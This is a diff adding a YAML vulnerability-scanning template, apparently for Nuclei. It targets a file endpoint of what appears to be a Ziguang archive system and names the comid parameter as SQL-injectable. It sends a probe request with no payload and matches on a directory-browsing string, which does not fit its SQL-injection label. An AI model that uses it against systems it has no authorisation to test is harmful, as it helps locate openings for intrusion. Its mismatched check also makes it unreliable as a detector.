@@ -1,0 +1,26 @@
+
+id: ziguang-selectFileRemote-sqli
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /Archive/ErecordManage/selectFileRemote HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        userID=admin&fondsid=1&comid=1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"目录浏览")
+#comid存在sql
